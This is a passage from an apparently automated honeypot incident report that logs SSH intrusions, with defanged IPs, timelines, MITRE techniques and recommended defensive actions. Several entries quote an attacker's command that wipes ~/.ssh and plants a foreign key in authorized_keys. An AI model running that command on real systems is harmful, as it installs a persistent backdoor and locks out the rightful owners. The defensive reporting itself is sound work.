| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:15:57` | `cowrie.session.connect` |
| `2026-04-24 17:15:57` | `cowrie.client.version` |
| `2026-04-24 17:15:57` | `cowrie.client.kex` |
| `2026-04-24 17:15:58` | `cowrie.login.success` |
| `2026-04-24 17:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.219.126[.]124` to AbuseIPDB if not already reported
- [ ] Block `102.219.126[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40484e61790a

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:20 |
| **Last Seen** | 2026-04-24 17:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:20:31` | `cowrie.session.connect` |
| `2026-04-24 17:20:31` | `cowrie.client.version` |
| `2026-04-24 17:20:31` | `cowrie.client.kex` |
| `2026-04-24 17:20:31` | `cowrie.login.success` |
| `2026-04-24 17:20:31` | `cowrie.session.params` |
| `2026-04-24 17:20:31` | `cowrie.command.input` |
| `2026-04-24 17:20:31` | `cowrie.command.failed` |
| `2026-04-24 17:20:31` | `cowrie.log.closed` |
| `2026-04-24 17:20:32` | `cowrie.session.params` |
| `2026-04-24 17:20:32` | `cowrie.command.input` |
| `2026-04-24 17:20:32` | `cowrie.session.file_download` |
| `2026-04-24 17:20:32` | `cowrie.log.closed` |
| `2026-04-24 17:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca3ea085eb94

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:20 |
| **Last Seen** | 2026-04-24 17:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:20:33` | `cowrie.session.connect` |
| `2026-04-24 17:20:33` | `cowrie.client.version` |
| `2026-04-24 17:20:33` | `cowrie.client.kex` |
| `2026-04-24 17:20:34` | `cowrie.login.success` |
| `2026-04-24 17:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-166b42e980a1

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:23 |
| **Last Seen** | 2026-04-24 17:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:23:32` | `cowrie.session.connect` |
| `2026-04-24 17:23:32` | `cowrie.client.version` |
| `2026-04-24 17:23:32` | `cowrie.client.kex` |
| `2026-04-24 17:23:33` | `cowrie.login.success` |
| `2026-04-24 17:23:33` | `cowrie.session.params` |
| `2026-04-24 17:23:33` | `cowrie.command.input` |
| `2026-04-24 17:23:33` | `cowrie.command.failed` |
| `2026-04-24 17:23:33` | `cowrie.log.closed` |
| `2026-04-24 17:23:34` | `cowrie.session.params` |
| `2026-04-24 17:23:34` | `cowrie.command.input` |
| `2026-04-24 17:23:34` | `cowrie.session.file_download` |
| `2026-04-24 17:23:34` | `cowrie.log.closed` |
| `2026-04-24 17:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4cb2dc77223

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:23 |
| **Last Seen** | 2026-04-24 17:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:23:36` | `cowrie.session.connect` |
| `2026-04-24 17:23:36` | `cowrie.client.version` |
| `2026-04-24 17:23:36` | `cowrie.client.kex` |
| `2026-04-24 17:23:36` | `cowrie.login.success` |
| `2026-04-24 17:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee30be1abb8

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:26 |
| **Last Seen** | 2026-04-24 17:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:26:36` | `cowrie.session.connect` |
| `2026-04-24 17:26:36` | `cowrie.client.version` |
| `2026-04-24 17:26:36` | `cowrie.client.kex` |
| `2026-04-24 17:26:36` | `cowrie.login.success` |
| `2026-04-24 17:26:37` | `cowrie.session.params` |
| `2026-04-24 17:26:37` | `cowrie.command.input` |
| `2026-04-24 17:26:37` | `cowrie.command.failed` |
| `2026-04-24 17:26:37` | `cowrie.log.closed` |
| `2026-04-24 17:26:37` | `cowrie.session.params` |
| `2026-04-24 17:26:37` | `cowrie.command.input` |
| `2026-04-24 17:26:37` | `cowrie.session.file_download` |
| `2026-04-24 17:26:37` | `cowrie.log.closed` |
| `2026-04-24 17:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5285dc83b37f

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:26 |
| **Last Seen** | 2026-04-24 17:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:26:39` | `cowrie.session.connect` |
| `2026-04-24 17:26:39` | `cowrie.client.version` |
| `2026-04-24 17:26:39` | `cowrie.client.kex` |
| `2026-04-24 17:26:40` | `cowrie.login.success` |
| `2026-04-24 17:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62b6de7c714

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:26 |
| **Last Seen** | 2026-04-24 17:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:26:46` | `cowrie.session.connect` |
| `2026-04-24 17:26:46` | `cowrie.client.version` |
| `2026-04-24 17:26:46` | `cowrie.client.kex` |
| `2026-04-24 17:26:47` | `cowrie.login.success` |
| `2026-04-24 17:26:47` | `cowrie.session.params` |
| `2026-04-24 17:26:47` | `cowrie.command.input` |
| `2026-04-24 17:26:47` | `cowrie.command.failed` |
| `2026-04-24 17:26:47` | `cowrie.log.closed` |
| `2026-04-24 17:26:47` | `cowrie.session.params` |
| `2026-04-24 17:26:47` | `cowrie.command.input` |
| `2026-04-24 17:26:47` | `cowrie.session.file_download` |
| `2026-04-24 17:26:47` | `cowrie.log.closed` |
| `2026-04-24 17:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fc8b506a5e6

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:26 |
| **Last Seen** | 2026-04-24 17:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:26:49` | `cowrie.session.connect` |
| `2026-04-24 17:26:49` | `cowrie.client.version` |
| `2026-04-24 17:26:49` | `cowrie.client.kex` |
| `2026-04-24 17:26:49` | `cowrie.login.success` |
| `2026-04-24 17:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03eb14cd635e

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:27 |
| **Last Seen** | 2026-04-24 17:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:27:41` | `cowrie.session.connect` |
| `2026-04-24 17:27:41` | `cowrie.client.version` |
| `2026-04-24 17:27:41` | `cowrie.client.kex` |
| `2026-04-24 17:27:42` | `cowrie.login.success` |
| `2026-04-24 17:27:42` | `cowrie.session.params` |
| `2026-04-24 17:27:42` | `cowrie.command.input` |
| `2026-04-24 17:27:42` | `cowrie.command.failed` |
| `2026-04-24 17:27:42` | `cowrie.log.closed` |
| `2026-04-24 17:27:42` | `cowrie.session.params` |
| `2026-04-24 17:27:42` | `cowrie.command.input` |
| `2026-04-24 17:27:43` | `cowrie.session.file_download` |
| `2026-04-24 17:27:43` | `cowrie.log.closed` |
| `2026-04-24 17:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4bac752236c

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:27 |
| **Last Seen** | 2026-04-24 17:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:27:44` | `cowrie.session.connect` |
| `2026-04-24 17:27:44` | `cowrie.client.version` |
| `2026-04-24 17:27:44` | `cowrie.client.kex` |
| `2026-04-24 17:27:45` | `cowrie.login.success` |
| `2026-04-24 17:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b365f6f7d28

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]34` |
| **First Seen** | 2026-04-24 17:28 |
| **Last Seen** | 2026-04-24 17:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:28:17` | `cowrie.session.connect` |
| `2026-04-24 17:28:17` | `cowrie.client.version` |
| `2026-04-24 17:28:17` | `cowrie.client.kex` |
| `2026-04-24 17:28:18` | `cowrie.login.success` |
| `2026-04-24 17:28:18` | `cowrie.session.params` |
| `2026-04-24 17:28:18` | `cowrie.command.input` |
| `2026-04-24 17:28:18` | `cowrie.command.failed` |
| `2026-04-24 17:28:18` | `cowrie.log.closed` |
| `2026-04-24 17:28:18` | `cowrie.session.params` |
| `2026-04-24 17:28:18` | `cowrie.command.input` |
| `2026-04-24 17:28:18` | `cowrie.session.file_download` |
| `2026-04-24 17:28:18` | `cowrie.log.closed` |
| `2026-04-24 17:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2242b8d07f2b

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]34` |
| **First Seen** | 2026-04-24 17:28 |
| **Last Seen** | 2026-04-24 17:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:28:20` | `cowrie.session.connect` |
| `2026-04-24 17:28:20` | `cowrie.client.version` |
| `2026-04-24 17:28:20` | `cowrie.client.kex` |
| `2026-04-24 17:28:21` | `cowrie.login.success` |
| `2026-04-24 17:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b96d604aa65b

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:29 |
| **Last Seen** | 2026-04-24 17:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:29:21` | `cowrie.session.connect` |
| `2026-04-24 17:29:21` | `cowrie.client.version` |
| `2026-04-24 17:29:21` | `cowrie.client.kex` |
| `2026-04-24 17:29:22` | `cowrie.login.success` |
| `2026-04-24 17:29:22` | `cowrie.session.params` |
| `2026-04-24 17:29:22` | `cowrie.command.input` |
| `2026-04-24 17:29:22` | `cowrie.command.failed` |
| `2026-04-24 17:29:22` | `cowrie.log.closed` |
| `2026-04-24 17:29:22` | `cowrie.session.params` |
| `2026-04-24 17:29:22` | `cowrie.command.input` |
| `2026-04-24 17:29:23` | `cowrie.session.file_download` |
| `2026-04-24 17:29:23` | `cowrie.log.closed` |
| `2026-04-24 17:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8ae904edfb7

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:29 |
| **Last Seen** | 2026-04-24 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:29:24` | `cowrie.session.connect` |
| `2026-04-24 17:29:24` | `cowrie.client.version` |
| `2026-04-24 17:29:25` | `cowrie.client.kex` |
| `2026-04-24 17:29:25` | `cowrie.login.success` |
| `2026-04-24 17:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0103aac1f559

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:30 |
| **Last Seen** | 2026-04-24 17:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:30:19` | `cowrie.session.connect` |
| `2026-04-24 17:30:19` | `cowrie.client.version` |
| `2026-04-24 17:30:19` | `cowrie.client.kex` |
| `2026-04-24 17:30:20` | `cowrie.login.success` |
| `2026-04-24 17:30:20` | `cowrie.session.params` |
| `2026-04-24 17:30:20` | `cowrie.command.input` |
| `2026-04-24 17:30:20` | `cowrie.command.failed` |
| `2026-04-24 17:30:20` | `cowrie.log.closed` |
| `2026-04-24 17:30:21` | `cowrie.session.params` |
| `2026-04-24 17:30:21` | `cowrie.command.input` |
| `2026-04-24 17:30:21` | `cowrie.session.file_download` |
| `2026-04-24 17:30:21` | `cowrie.log.closed` |
| `2026-04-24 17:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba9d99074d55

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:30 |
| **Last Seen** | 2026-04-24 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:30:23` | `cowrie.session.connect` |
| `2026-04-24 17:30:23` | `cowrie.client.version` |
| `2026-04-24 17:30:23` | `cowrie.client.kex` |
| `2026-04-24 17:30:23` | `cowrie.login.success` |
| `2026-04-24 17:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9beb17c6232a

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:31 |
| **Last Seen** | 2026-04-24 17:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
